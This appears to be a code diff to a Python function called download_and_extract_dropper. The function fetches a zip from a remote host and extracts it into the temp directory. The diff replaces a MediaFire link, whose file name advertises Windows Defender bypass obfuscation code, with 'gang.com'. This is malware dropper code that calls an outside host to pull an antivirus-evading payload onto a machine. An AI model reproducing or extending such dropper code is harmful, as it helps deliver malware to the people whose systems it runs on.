@@ -7,7 +7,7 @@ def download_and_extract_dropper():
     """
     Downloads and extracts a dropper from a remote URL.
     """
-    url = 'https://www.mediafire.com/file/61dbqracw002n8a/Windows+Defender+Bypassing+Obfuscation+Code.py.zip/file'
+    url = 'gang.com'
     zip_response = urllib.request.urlopen(url)
     zip_file = zipfile.ZipFile(zip_response)
     zip_file.extractall(tempfile.gettempdir())
